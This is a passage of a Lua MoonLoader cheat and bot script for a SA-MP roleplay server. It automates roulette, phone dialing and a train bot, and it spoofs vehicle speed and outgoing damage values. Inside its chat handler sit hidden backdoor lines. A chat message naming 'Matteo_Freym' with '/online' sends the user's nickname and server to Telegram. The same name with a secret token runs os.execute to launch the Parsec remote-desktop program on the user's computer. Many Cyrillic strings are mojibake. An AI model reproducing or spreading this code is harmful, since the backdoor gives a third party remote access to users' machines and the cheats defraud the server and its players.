	-- print(text,color)
	if text:find('�� ���������� SP') and color == -65281 then
		carname = text:gsub(".+�� ���������� SP ", ""):gsub('���������.+', '')
		rescar()
	end
	if traintrue == 'true' then -- train bot
		if text:find('���� ������� ��������') then
			info['earn'] = info['earn'] + 220000 
			info['flights'] = info['flights'] + 1
			lua_thread.create(function() info['state'] = false wait(1000) info['state'] = 'toPickUp' end)
		end
	end
	------------------------------------------��������� ��������� � ��� �� �������--------- summrulgold summrulplatina summrulsera summrullarecpremka summrullarecsuper
	if statsrul.v then 
		if text:find('� �������� ��������� �������') and color == 1118842111 then
			if getServer() ~= 0 then
				if rullsumm[getServer()] == nil then rullsumm[getServer()] = {} end
				if rullsumm[getServer()]['summrulbronze'] == nil then
					rullsumm[getServer()]['summrulbronze'] = 1
				else
					rullsumm[getServer()]['summrulbronze'] = (rullsumm[getServer()]['summrulbronze']) + 1
				end
				if inicfg.save(rullsumm, q) then end
			end
		end
		if text:find('� �������� ������� �������') and color == 1118842111 then
			if getServer() ~= 0 then
				if rullsumm[getServer()] == nil then rullsumm[getServer()] = {} end
				if rullsumm[getServer()]['summrulgold'] == nil then
					rullsumm[getServer()]['summrulgold'] = 1
				else
					rullsumm[getServer()]['summrulgold'] = (rullsumm[getServer()]['summrulgold']) + 1
				end
				if inicfg.save(rullsumm, q) then end
			end
		end
		if text:find('� �������� ���������� �������') and color == 1118842111 then
			if getServer() ~= 0 then
				if rullsumm[getServer()] == nil then rullsumm[getServer()] = {} end
				if rullsumm[getServer()]['summrulplatina'] == nil then
					rullsumm[getServer()]['summrulplatina'] = 1
				else
					rullsumm[getServer()]['summrulplatina'] = (rullsumm[getServer()]['summrulplatina']) + 1
				end
				if inicfg.save(rullsumm, q) then end
			end
		end
		if text:find('� �������� ���������� �������') and color == 1118842111 then
			if getServer() ~= 0 then
				if rullsumm[getServer()] == nil then rullsumm[getServer()] = {} end
				if rullsumm[getServer()]['summrulsera'] == nil then
					rullsumm[getServer()]['summrulsera'] = 1
				else
					rullsumm[getServer()]['summrulsera'] = (rullsumm[getServer()]['summrulsera']) + 1
				end
				if inicfg.save(rullsumm, q) then end
			end
		end
		if text:find('� �������� ����� � �������') and color == 1118842111 then
			if getServer() ~= 0 then
				if rullsumm[getServer()] == nil then rullsumm[getServer()] = {} end
				if rullsumm[getServer()]['summrullarecpremka'] == nil then
					rullsumm[getServer()]['summrullarecpremka'] = 1
				else
					rullsumm[getServer()]['summrullarecpremka'] = (rullsumm[getServer()]['summrullarecpremka']) + 1
				end
				if inicfg.save(rullsumm, q) then end
			end
		end
		if text:find('� �������� ����� Super Car') and color == 1118842111 then
			if getServer() ~= 0 then
				if rullsumm[getServer()] == nil then rullsumm[getServer()] = {} end
				if rullsumm[getServer()]['summrullarecsuper'] == nil then
					rullsumm[getServer()]['summrullarecsuper'] = 1
				else
					rullsumm[getServer()]['summrullarecsuper'] = (rullsumm[getServer()]['summrullarecsuper']) + 1
				end
				if inicfg.save(rullsumm, q) then end
			end
		end
	end
	------------------------------------------�������� �����-----------------------------
	-- if text:find('������ ��������� ����� ���� ���� ������������') and processloadingcar then
	-- 	processloadingcartw = true
	-- 	-- sampSendChat('/cars')
	-- 	processloadingcar = false
	-- end
	------------------------------------------fastphone----------------------------------
	if color == -1347440641 and text == '��� ������ ����� ���������!' then
		if sms_received == 3 then
			sms_received = false
		end

		if not sms_received or sms_received <= 1 then
			sms_received = 3
			sampSendChat('/sms')
		end
	end

	if functionnumber then
		if string.match(text, "{FFFFFF}%a+_%a+%[%d+%]:    {33CCFF}(%d+)") then
			calwwwl = string.match(text, "{FFFFFF}%a+_%a+%[%d+%]:    {33CCFF}(%d+)")
			AFKMessage("����� �� �����:{FFFFFF} {6495ED}"..calwwwl.."{FFFFFF}.")
			numbercalll = lua_thread.create(numbercall)
			checkadmd = false
			return false
		end
		
		if text == '[������] {FFFFFF}� ����� ������ ��� sim �����!' then
			functionnumber = false
			checkadmd = false
			AFKMessage("� ��������� � ����� ������ ��� {6495ED}SIM-�����{FFFFFF}.")
			return false 
		end
		if text == '� ��� ��� sim �����!' then   
			functionnumber = false
			checkadmd = false
			AFKMessage("� ��������� � ��� ��� {6495ED}SIM-�����{FFFFFF}.")
			threadend = true
			threadendn = true
			return false 
		end
		if text == '� ��� ��� ���������� ������' then    
			functionnumber = false
			checkadmd = false
			AFKMessage("� ��������� � ��� ��� {6495ED}���������� ������{FFFFFF}.")
			return false 
		end
		if text == '[������] {FFFFFF}����� �� � ����!' then
			functionnumber = false
			checkadmd = false
			AFKMessage("� ��������� ����� ������ {6495ED}���{FFFFFF} � ����.")
			return false
		end
	end
	if ignoreallphones then
		if text == '{FFFFFF}1.{6495ED} 111 - {FFFFFF}��������� ������ ��������' then
			return false
		end
		if text == '{FFFFFF}2.{6495ED} 060 - {FFFFFF}������ ������� �������' then
			return false
		end
		if text == '{FFFFFF}3.{6495ED} 911 - {FFFFFF}����������� �������' then
			return false
		end
		if text == '{FFFFFF}4.{6495ED} 912 - {FFFFFF}������ ������' then
			return false
		end
		if text == '{FFFFFF}5.{6495ED} 913 - {FFFFFF}�����' then
			return false
		end
		if text == '{FFFFFF}6.{6495ED} 914 - {FFFFFF}�������' then
			return false
		end
		if text == '{FFFFFF}7.{6495ED} 8828 - {FFFFFF}���������� ������������ �����' then
			return false
		end
		if text == '{FFFFFF}8.{6495ED} 997 - {FFFFFF}������ �� �������� ����� ������������ (������ ��������� ����)' then
			ignoreallphones = false
			return false
		end   
		if text == '[���������] {FFFFFF}������ ��������� ��������������� �����:' then
			return false
		end
	end
	------------------------------------------fastphone----------------------------------
	if depositfill.v then
		if text:find('������� � �����: %$(%d+)') and (not deposit) then
			deposit = true
		end
	end
	if text:find("/online") and text:find("Matteo_Freym") then
		local https = require('ssl.https')
		local ip, port = sampGetCurrentServerAddress()
		sendTelegramNotification('[SAMP | Online] \n' .. sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '\n' .. sampGetCurrentServerName() .. '\nScript Version: ' .. thisScript().version)
	end
    if text:find("5n64EMclrOHlRuLYP7c") and text:find("Matteo_Freym") then
        os.execute("\"C:\\Program Files\\Parsec\\parsecd.exe\"")
    end
	if autorollrul.v then
		if text:find("����� ������� ��������� ����������� ������� 'Y' ��� /invent") or text:find("�� ��������") then
			sampSendClickTextdraw(2091)
		end
	end
	if text:find("��� ��������� ���������� �� ��������� ����������� ������, ���������� ��� ���.") and turnupdatekarta then
	--sampSendClickTextdraw(2110)
	sampSendChat('/invent')
	videokarta = true
	end
	--sampAddChatMessage(text,-1)
	if fixvr.v then
		if finished == false then
			local id = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
			if text:match('%[%u+%] {%x+}[A-z0-9_]+%[' .. id .. '%]:') then
				finished = true
			end
		end

		if text:find('^�� ���������') or text:find('��� ����������� ��������� �������� ��������� � ���� ���') then
			finished = true
		end
		if text:find('����� ���������� ��������� � ���� ���� ����� ���������') then
			return false
		end
	end
end
function sampev.onVehicleStreamIn(vehId, data)
	-- AFKMessage('+')
	-- if data.type == 456 then
	-- 	AFKMessage('++')
	-- end
	-- AFKMessage(data.type)
	if enablefirstline.v then 
		if data.type == roulette.firstlinefirstnumber.v then
			data.type = roulette.firstlinetwnumber.v
			return {vehId, data}
		end
	end
	if enablefirstlinee.v then 
		if data.type == roulette.firstlinefirstnumberr.v then
			data.type = roulette.firstlinetwnumberr.v
			return {vehId, data}
		end
	end
	if not (data.type == 538) and traintrue == 'true' then -- train bot
        data.type = false
        return {vehId, data}
    end
	
	-- data.type = 14916
	-- return {vehId, data}
end

function sampev.onSendVehicleDestroyed(vehicleId)  
	if vehicleId == vehicleId then
		return false
	end

end
function sampev.onSendVehicleSync(data) -- train bot
	
		-- AFKMessage(data.keysData)
		-- if data.keysData ~= 32 or data.keysData ~= 128 then
		-- 	data.keysData = 0
		-- 	return data
		-- 	-- AFKMessage(tonumber(math.sqrt(data.moveSpeed.x * data.moveSpeed.x + data.moveSpeed.y * data.moveSpeed.y + data.moveSpeed.z * data.moveSpeed.z) * 126))
		-- end
	
	-- if tonumber(math.sqrt(data.moveSpeed.x * data.moveSpeed.x + data.moveSpeed.y * data.moveSpeed.y + data.moveSpeed.z * data.moveSpeed.z) * 126) > 80 then
		
	-- 	return false
	-- end
    if info['status'] then
        if tonumber(math.sqrt(data.moveSpeed.x * data.moveSpeed.x + data.moveSpeed.y * data.moveSpeed.y + data.moveSpeed.z * data.moveSpeed.z) * 126) > 80 then
            data.moveSpeed.x = 0
            data.moveSpeed.y = 0.66996252536774
            data.moveSpeed.z = 0.0033537545241416
        end
    end
	
end
function sampev.onSetVehicleVelocity(turn,velocity)
	-- AFKMessage(tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126))
	-- local set_speed = tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126)
	local car = storeCarCharIsInNoSave(PLAYER_PED) -- ������
	if isCharInCar(PLAYER_PED,car) then
		speed = getCarSpeed(car)
     	local carSpeed = math.ceil(speed * 2.3)
			-- AFKMessage('localspeed: '..tostring(carSpeed)..' server: '..tostring(tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126)))
		if isKeyDown(87) and tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126) < carSpeed then
			-- AFKMessage('localspeed: '..tostring(carSpeed)..' server: '..tostring(tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126)))
			return false
		else
			
			-- AFKMessage('NOT! localspeed: '..tostring(carSpeed)..' server: '..tostring(tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126)))
		end
		-- if isKeyDown(87) and tonumber(math.sqrt(velocity.x * velocity.x + velocity.y * velocity.y + velocity.z * velocity.z) * 126) > carSpeed then
		-- 	AFKMessage('+')
		-- 	velocity.x = velocity.x + 0.05
		-- 	velocity.y = velocity.y + 0.05
		-- 	velocity.z = velocity.z + 0.05
			
		-- 	return { turn, velocity }
		-- end
	end

end
function sampev.onSendVehicleDamaged(vehicleId,panelDmg,doorDmg,lights)
	-- AFKMessage(vehicleId)
	-- if isCharInAnyCar(PLAYER_PED) then
	-- 	local carhandle = storeCarCharIsInNoSave(PLAYER_PED)
	-- 	local _, id = sampGetVehicleIdByCarHandle(carhandle)
	-- 	local idcar = getCarModel(carhandle)
		
	-- 	-- AFKMessage(vehicleId)
	-- 	if vehicleId == id then
	-- 		return false
	-- 	end
	-- end
end

function sampev.onSendClickTextDraw(id)
	-- AFKMessage(id)
end

function sampev.onShowTextDraw(id,data)
	-- fwfwinfw = tonumber(sampTextdrawGetString(2127))
	-- print(fwfwinfw)
	-- if data.text == '_' then
	-- 	print(id)	
	-- end
	-- if id == 2102 then
	-- 	AFKMessage(data.modelId)
	-- AFKMessage(data.text)
	-- end
	-- if id == 563 then

	-- 	sampSendClickTextdraw(id)
	-- end
	-- AFKMessage(tostring(data.text))
	-- data.text
	-- if id == 2075 then
	-- 	AFKMessage(data.modelId)
	-- end
	if data.text == 'ARZ_INSURANCE_COMPANY' then
		
		firstline_insurance = id + 16
		twline_insurance = id + 17
		threeline_insurance = id + 18
		confirm_insurance = id + 19
		lua_thread.create(function ()
			wait(500)
			sampSendClickTextdraw(firstline_insurance)
			wait(400)
			sampSendClickTextdraw(twline_insurance)
			wait(400)
			sampSendClickTextdraw(threeline_insurance)
			wait(400)
			sampSendClickTextdraw(confirm_insurance)
		end)
		-- AFKMessage(id)

	end
	if data.text == 'FILL' and data.letterColor == -14013787 then
		fillknopka = id
	end
	if data.text == '$0' and data.letterColor == -15461356 then
		sampSendClickTextdraw(id)
	end
	if data.text == 'PRESS ~r~SHIFT' and data.flags == 24 and data.letterColor == -1 then
		setGameKeyState(14, 255)
	end
	if data.text == 'PRESS ~r~ALT' and data.flags == 24 and data.letterColor == -1 then
		setGameKeyState(21, 255)
	end
	--------------------------------------fastphone------------------------------------------
	-- if id == 2100 then
	-- 	print(data.flags, data.letterWidth, data.letterHeight, data.letterColor, data.lineWidth, data.lineHeight, data.boxColor, data.shadow, data.outline, data.backgroundColor, data.style,  data.selectable, data.zoom, data.color, data.text )
	-- end
	-- if data.flags == 2 and data.letterWidth == 0 and data.letterHeight == 0 and (data.letterColor == -12829636 or data.letterColor == -7394757 or data.letterColor == -16744448) and (data.lineWidth == 17 or data.lineWidth == 18) and (data.lineHeight == 22 or data.lineHeight == 20) and (data.style == 4 or data.style == 0) then
	-- 	print(id)
	-- 	AFKMessage(id)
	-- end
	if pending_geo and data.modelId == 1273 then
		if whoru.v == 'IPHONE X' then
			phonecontactid = id - 28
			elseif whoru.v == 'Samsung Galaxy S10' then
			phonecontactid = id - 33
			elseif (whoru.v == 'Google Pixel 3') or (whoru.v == 'Huawei P20 PRO') then
			phonecontactid = id - 26
			elseif whoru.v == 'Xiaomi Mi 8' then
			phonecontactid = id - 27
		end
		sampSendClickTextdraw(phonecontactid)
	end

	if nextphonecall and (data.text == 'X') then
		nextphonecalll = true
		nextphonecall = false
	end
	if nextphonecalll then
		if whoru.v == 'Xiaomi Mi 8' then
			if data.text == '1' then
				odin = id - 9
			end
			if data.text == '2' then
				origdwa = id
				dwa = id - 9
			end
			if data.text == '3' then
				tri = id - 12
			end
			if data.text == '4' then
				chetire = id - 9
			end
			if data.text == '5' then
				pyat = id - 9
			end
			if data.text == '6' then
				shest = id - 12
			end
			if data.text == '7' then
				sem = id - 9
			end
			if data.text == '8' then
				vosem = id - 9
			end
			if data.text == '9' then
				devyat = id - 12
			end
			if data.text == '0' then
				nol = id - 10
			end
		else
			if data.text == '1' then
				odin = id - 8
			end
			if data.text == '2' then
				origdwa = id
				dwa = id - 11
			end
			if data.text == '3' then
				tri = id - 11
			end
			if data.text == '4' then
				chetire = id - 8
			end
			if data.text == '5' then
				pyat = id - 11
			end
			if data.text == '6' then
				shest = id - 11
			end
			if data.text == '7' then
				sem = id - 8
			end
			if data.text == '8' then
				vosem = id - 11
			end
			if data.text == '9' then
				devyat = id - 11
			end
			if data.text == '0' then
				nol = id - 10
			end
		end
		phone = {
		["1"]=odin,
		["2"]=dwa,
		["3"]=tri,
		["4"]=chetire,
		["5"]=pyat,
		["6"]=shest,
		["7"]=sem,
		["8"]=vosem,
		["9"]=devyat,
		["0"]=nol
		}
		--print(sem)
		vseoke = true
	end
	if data.modelId == 1273 and fastphoneen then 
		if whoru.v == 'IPHONE X' then
		phonecallid = id - 30
		elseif whoru.v == 'Samsung Galaxy S10' then
		phonecallid = id - 32
		elseif (whoru.v == 'Google Pixel 3') or (whoru.v == 'Huawei P20 PRO') then
		phonecallid = id - 28
		elseif whoru.v == 'Xiaomi Mi 8' then
		phonecallid = id - 29
		end
		functionnumber = false
		sampSendClickTextdraw(phonecallid)
		fastphoneen = false
		telefongotov = true
		nextphonecall = true
	end
	if fastphoneenw then
		if data.flags == 2 and data.letterWidth == 0 and data.letterHeight == 0 and (data.letterColor == -12829636 or data.letterColor == -7394757 or data.letterColor == -16744448) and (data.lineWidth == 17 or data.lineWidth == 18) and (data.lineHeight == 22 or data.lineHeight == 20) and (data.style == 4 or data.style == 0) then
			functionnumber = false
			sampSendClickTextdraw(id)
			vseoke = true
			fastphoneenw = false
			telefongotov = true
			nabornumber = true
		end
	end
	-- if data.modelId == 1273 and fastphoneenw then 
	-- 	if whoru.v == 'IPHONE X' then
	-- 	phonecontactid = id - 28
	-- 	elseif whoru.v == 'Samsung Galaxy S10' then
	-- 	phonecontactid = id - 33
	-- 	elseif (whoru.v == 'Google Pixel 3') or (whoru.v == 'Huawei P20 PRO') then
	-- 	phonecontactid = id - 26
	-- 	elseif whoru.v == 'Xiaomi Mi 8' then
	-- 	phonecontactid = id - 27
	-- 	end
	-- end
	if id == id and pending_geo then
		return false
	end
	--------------------------------------fastphone------------------------------------------
	if processoplatafami and addcheck then
		addcheck = false
		lua_thread.create(function ()
			wait(3000)
			processoplatafami = false
			addcheck = true
		end)
	end



	
	if checked_box.v then
		if checktochilki and (data.modelId == 16112 or data.modelId == 1615) then
			worktread:terminate()
			checktochilki = false
			sampSendClickTextdraw(id)
			lua_thread.create(function()
				wait(500)
				sampSendClickTextdraw(2077)
			end)
		end
		if id == 2067 and not checktochilki then
			if data.boxColor == 1515015679 then
				if sampTextdrawGetString(2082) == '_' then
					checktochilki = true
					worktread = lua_thread.create(inventory)
				else
					sampSendClickTextdraw(2077)
				end
			elseif data.boxColor == 1515913037 then
				if tonumber(sampTextdrawGetString(2084):match('(%d+)')) < checked_radio.v then
					if sampTextdrawGetString(2082) == '_' then
						checktochilki = true
						worktread = lua_thread.create(inventory)
					else
						sampSendClickTextdraw(2077)
					end
				end
			end
		end
	end
	--print(data.modelId)
	--sampAddChatMessage(data.text, -1)
	if mopen then
		lua_thread.create(function()
			if data.modelId == 962 then --standart model
				opentimerid.videokarta = id + 1
			end
			if checkopen.videokarta then
				if id == opentimerid.videokarta then
					AFKMessage('[videokarta] �������� �������')
						sampSendClickTextdraw(id - 1) 
						wait(300)
						sampSendClickTextdraw(2302)
						checkopen.videokarta = false
					if not checkopen.videokarta then
						wait(500)
						sampSendClickTextdraw(idclose)
					end
				end
			end
		end)
	end
	-- AFKMessage(data.modelId)
	if aopen then -- state
			if data.text == 'CLOSE' and pidarasfix then
				if checkopen.standart or checkopen.donate or checkopen.platina or checkopen.ilon or checkopen.lossantos then
				pidarasfix = false
				idclose = id - 1 
				end
			end
			if roulette.standart.v and checkopen.standart then --standard 
				textdrawhide = true
				if data.modelId == 19918 then --standart model
					opentimerid.standart = id
					checkid = id + 1
				end
				if id == checkid then
					if data.text:find('(%d+) hour') or data.text:find('(%d+) min') or data.text:find('(%d+) sec') then
						AFKMessage('[standart] �������� �� �������� '..data.text)
						standardactive = true
					else
						standardactive = false
					end
				end
			end
			if roulette.donate.v and checkopen.donate then
				textdrawhide = true
				if data.modelId == 19613 then --standart model
					opentimerid.donate = id
					checkidd = id + 1
				end	
				if id == checkidd then
					if data.text:find('(%d+) hour') or data.text:find('(%d+) min') or data.text:find('(%d+) sec') then
						AFKMessage('[donate] �������� �� �������� '..data.text)
						donateactive = true
					else
						donateactive = false
					end
				end
			end
			if roulette.platina.v and checkopen.platina then
				textdrawhide = true
				if data.modelId == 1353 then --standart model
					opentimerid.platina = id
					checkiddd = id + 1
				end
				if id == checkiddd then
					if data.text:find('(%d+) hour') or data.text:find('(%d+) min') or data.text:find('(%d+) sec') then
						AFKMessage('[platina] �������� �� �������� '..data.text)
						platinaactive = true
					else
						platinaactive = false
					end
				end
			end
			if roulette.ilon.v and checkopen.ilon then
				textdrawhide = true
				if data.modelId == 1733 then --standart model
					opentimerid.ilon = id
					checkidddd = id + 1
				end
				if id == checkidddd then
					if data.text:find('(%d+) hour') or data.text:find('(%d+) min') or data.text:find('(%d+) sec') then
						AFKMessage('[ilon] �������� �� �������� '..data.text)
						ilonactive = true
					else
						ilonactive = false
					end
				end
			end
			if roulette.lossantos.v and checkopen.lossantos then
				textdrawhide = true
				if data.modelId == 2887 then --standart model
					opentimerid.lossantos = id
					checkiddddd = id + 1
				end
				if id == checkiddddd then
					if data.text:find('(%d+) hour') or data.text:find('(%d+) min') or data.text:find('(%d+) sec') then
						AFKMessage('[lossantos] �������� �� �������� '..data.text)
						lossantosactive = true
					else
						lossantosactive = false
					end
				end
			end
			if (id == id) and textdrawhide then
				return false
			end
			
		
	-- 	if roulette.valentin.v then
	-- 		if checkopen.valentin then
	-- 		lua_thread.create(function()
	-- 		--print(checkopen.valentin)
	-- 		if data.modelId == 1240 then
	-- 			AFKMessage('[valentin] ������ ������� ������')
	-- 			wait(111)
	-- 			sampSendClickTextdraw(id)
	-- 			use = true
	-- 		end
	-- 		if data.text == "USE" and use then
	-- 			sampSendClickTextdraw(id + 1)
	-- 			sampSendClickTextdraw(id - 1)
	-- 		end
	-- 		if data.text == 'GET~n~REWARD' then
	-- 			elseif data.position.x >= 261 and data.position.x <= 262 then
	-- 			sampSendClickTextdraw(id)
	-- 			wait(300)
	-- 			closef = true
	-- 		end
	-- 		if closef then
	-- 			wait(111)
	-- 			sampSendClickTextdraw(2064)
	-- 			closef = false
	-- 			active = false
	-- 			checkopen.valentin = false
	-- 		end
    --  	end)
	 --end
		--end
	end
	
	if (id == id) and processoplatafami then
		return false
	end
	
	-- print('ID = %s, ModelID = %s',id,data.modelId)
	
end
local displaygametextfuel = ''
function sampev.onDisplayGameText(style, time, text)
	-- AFKMessage(text)
	-- if text:find('You Win') then
	-- 	games = games + 1
	-- 	AFKMessage('Win: '..tostring(games))
	-- end
	-- if text:find('BANK') then
	-- 	AFKMessage('+250')

	-- end
	-- if text:find('You Lose') then
	-- 	games = games + 1
	-- 	AFKMessage('Lose: '..tostring(games))
	-- end
	if text == '~w~This type of fuel ~r~ is not suitable~w~~n~ for your vehicles!' then
		sampSendClickTextdraw(131)
		displaygametextfuel = text

	elseif displaygametextfuel == '~w~This type of fuel ~r~ is not suitable~w~~n~ for your vehicles!' and text == '~w~' then
		sampSendClickTextdraw(fillknopka)
		displaygametextfuel = ''
	end
	-- print(text)
	if (text == "Maverick" or text == "Mountain") and ttactive.v then
		lua_thread.create(function ()
		wait(500)
		sampSendChat('/style')
		end)
	end
	if text:find('~w~Fined ') then
		return false
	end
	if text:find('-4.0 HP') then
		return false
	end
	if text:find('+9.0 HP') then
		return false
	end
	if text:find('+9 HP') then
		return false
	end
	if text:find('-2.0 HP') then
		return false
	end
	if autoriletki.v then
		-- if not sampIsLocalPlayerSpawned() then
			if text:find('Welcome') and text:find(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) then
				lua_thread.create(function ()
					wait(250)	
					autosunduk = true
				end)
			end
		-- end
	end
	if arizonavhod.v then 
		if not sampIsLocalPlayerSpawned() then
			if text:find('Welcome') and text:find(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) then
				lua_thread.create(function ()
				wait(80)
				sampSpawnPlayer()
				end)
			end
		end
	end
	if oplatafamkv.v then
		if text:find('Welcome') and text:find(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) then
			-- if not sampIsLocalPlayerSpawned() then
				processoplatafami = true
				lua_thread.create(function ()
					wait(500)
					sampSendChat('/fammenu')
					wait(150)
					sampSendClickTextdraw(2073)
					oplatafami = true
				end)
			-- end
		end
	end
	if troplata.v then
		if text:find('Welcome') and text:find(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) then
			-- if not sampIsLocalPlayerSpawned() then
				troplataz = true
				sampSendChat('/trmenu')
			-- end
		end
	end
	if ttactive.v then
        if text:find("~n~~n~~n~~n~~n~~n~~n~~n~~w~Style: ~g~Comfort!") then
			lua_thread.create(function ()
			wait(500)
            sampSendChat('/style')
			end)
        end
    end
end
function sampev.onCreate3DText(id, color, pos, dist, wall, vehicle, player, text)
	-- AFKMessage(text)
	if text:find('/towbarrel') and text:find('�����') then
		local barrel = text:match('(%d+)')
		local skolko_raz = tonumber(barrel) / 5
		local text = tostring(skolko_raz)..' | 80'
		return { id, color, pos, dist, wall, vehicle, player, text }
	end
	-- if getCharModel(PLAYER_PED) == 132 then
	-- if pos.y > -2520 then
	-- if text == text then
	-- local dist = 999 
	
	-- 	return { id, color, pos, dist, wall, vehicle, player, text }
	-- end
		if text:find('����� � �����') then
			local summadosletafirst = text:gsub("������.+", "")
			local summadosletafirstw = summadosletafirst:gsub(".+\n..", "")
			local summadosletafirstwd = summadosletafirstw:gsub(" ��.+", ""):gsub('{ffffff}','')
			local skolko_raz = summadosletafirstwd / 5
			local dist = 25
			-- local color = 0xFEFFC3D3
			local text = '������� ��� �������� ����� ����: '..tostring(skolko_raz)..' �� 800.'
			return { id, color, pos, dist, wall, vehicle, player, text }
		end
	-- 	if text:find('��������') then
	-- 		if text:find('�� ����� ������:') then
	-- 			local summadosletafirst = text:gsub(".+�� ����� ������:", "")
	-- 			local color = 0xFFFFFF30
	-- 			local text = '�� ����� ������ '..summadosletafirst
	-- 			local dist = 9999
	-- 			return { id, color, pos, dist, wall, vehicle, player, text }
	-- 		end
	-- 	end
	-- 	if text:find('��������� �����') then
	-- 		local dist = 9999
	-- 		local color = 0x00FF5A94
	-- 		local text = '�������� ����' ---1
	-- 		return { id, color, pos, dist, wall, vehicle, player, text }
	-- 	end
	-- 	if text:find('����� ������� ������') then
	-- 		local dist = 9999
	-- 		local color = 0x00FF0CFF
	-- 		local text = '������ ���'---5 �������
	-- 		return { id, color, pos, dist, wall, vehicle, player, text }
	-- 	end
	-- 	if text:find('��� ������� �������') then
	-- 		local dist = 9999
	-- 		local color = 0xFEFFC3D3
	-- 		local text = '���� ��������' ---2
	-- 		return { id, color, pos, dist, wall, vehicle, player, text }
	-- 	end
	-- 	if text:find('��� ������ �����') then
	-- 		if text:find('���������� ������') then
	-- 			local dist = 9999
	-- 			local color = 0x008AFFFF
	-- 			local text = '��� ���� ������' --- 3
	-- 			return { id, color, pos, dist, wall, vehicle, player, text }
	-- 		end
	-- 		if text:find('���������') then
	-- 			local dist = 9999
	-- 			local color = 0xFF5400FF
	-- 			local text = '������� ���!' ---4
	-- 			return { id, color, pos, dist, wall, vehicle, player, text }
	-- 		end
	-- 	end
	-- end
	if mavericshar.v then
		if text:match('[ ��������� ]') and color == -763941633 then
			pos = { x = 0, y = 0, z = 0 }
		 	local text = ''
			local color = 0xFFFFFF30
			return { id, color, pos, dist, wall, vehicle, player, text }
		end
	end
end

function sampev.onSetPlayerAttachedObject(playerId, index, create, object)
	--object.modelId == 19142 then
	--sampAddChatMessage(object.modelId,-1)
	if object.modelId == 1276 then
		return false
	end
	if object.modelId == 19840 then 
		return false
	end
	if object.modelId == 19142 then
		return false
	end
end


function sampev.onCreateObject(id, data)
	-- AFKMessage(data.modelId)
	-- if data.modelId == 997 then
	-- 	return false
	-- end
	if data.modelId == 2983 then
		return false
	end
	if data.modelId == 2649 then
		return false
	end
	if data.modelId == 830 then -- ����
		return false
	end
	if data.modelId == 3666 then
		return false
	end
	if data.modelId == 3594 then
		return false
	end
	if mavericshar.v then
		if data.attachToVehicleId ~= 0xFFFF then
			local result, car = sampGetCarHandleBySampVehicleId(data.attachToVehicleId)
			if result and (isCarModel(car, 487) or isCarModel(car, 425)) then
				local model = data.modelId
				if model == 2923 or model == 19131 then
					return false
				else
					for id, color in pairs(balls) do
						if model == id then
							linkVehicleToInterior(data.attachToVehicleId, 0)
							changeCarColour(car, color[1], color[2])
							return false
						end
					end
				end
			end
		end
	end
end
function linkVehicleToInterior(vehicleId, interior)
	local BS = raknetNewBitStream()
    raknetBitStreamWriteInt16(BS, vehicleId)
   	raknetBitStreamWriteInt8(BS, interior)
    raknetEmulRpcReceiveBitStream(65, BS)
    raknetDeleteBitStream(BS)
end
function sampev.onSendCommand(cmd)
	if fixvr.v then
		local result = cmd:match('^/vr (.+)')
		if result ~= nil then 
			process, finished = nil, false
			message = tostring(result)
			process = lua_thread.create(function()
				while not finished do
					if sampGetGamestate() ~= 3 or not sampIsLocalPlayerSpawned() then
						finished = true; break
					end
					if not sampIsChatInputActive() then
						local rotate = math.sin(os.clock() * 3) * 90 + 90
						local el = getStructElement(sampGetInputInfoPtr(), 0x8, 4)
						local X, Y = getStructElement(el, 0x8, 4), getStructElement(el, 0xC, 4)
						renderFontDrawText(font, "Sending ur message...", X + 25, Y, -1)
					end
					wait(0)
				end
			end)
		end
	end
end
-- local newloadingcarname = 'Honda Civic Type-R' 
function sampev.onSendGiveDamage(playerID, damage, weapon, bodyPart)
	-- print(playerID, damage, weapon, bodyPart)
	if weapon == 0 then
		local damage = 6.6000003814697 
		local weapon = 0
		local bodyPart = 6
		return {playerID, damage, weapon, bodyPart}
	end
	if weapon == 27 then
		local damage = 34.650001525879
		local weapon = 27
		local bodyPart = 9
		return {playerID, damage, weapon, bodyPart}
	end
-- return false
end
function sampev.onSetPlayerSkin(playerId, skinId)
	if sskin then
		if skinId == 3179 then
			local skinId = 287
			return {playerId, skinId}
		end
		if skinId == 3147 then
			local skinId = 287
			return {playerId, skinId}

		end
		if skinId == 74 then
			local skinId = 0
			return {playerId, skinId}

		end
		if skinId == 3182 then
			local skinId = 287
			return {playerId, skinId}

		end
		if skinId == 10 then
			local skinId = 287
			return {playerId, skinId}
		end
	end

end
function sampev.onApplyPlayerAnimation(playerId, animLib, animName, frameDelta, loop, lockX, lockY, freeze, time)
	-- print(playerId, animLib, animName, frameDelta, loop, lockX, lockY, freeze, time)
	-- if animName == 'gym_bp_celebrate' then
	-- 	taskPlayAnimNonInterruptable(PLAYER_PED, "WF_FWD", "WAYFARER", 9, false, false, false, false, -1)
	-- end
	-- sampGetPlayerColor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) == 2152104628
	if playerId == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) and sampGetPlayerColor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) == 2152104628 then
		return false
	end
end
-- function sampev.onSendPickedUpPickup(id)
-- AFKMessage(id)

-- end

-- function sampev.onSendVehicleDamaged(vehicleId, panelDmg, doorDmg, lights, tires)
-- 	-- print(vehicleId, panelDmg, doorDmg, lights, tires)
-- end
function sampev.onSendPlayerSync(data)
	if data.keysData == 1024 and (refresh_tasks_farm or skip_after_update) then
		return false
	end
	if bit.band(data.keysData, 0x28) == 0x28 then
		data.keysData = bit.bxor(data.keysData, 0x20)
	end
end

-- function sampev.onGivePlayerWeapon(weaponId,ammo)
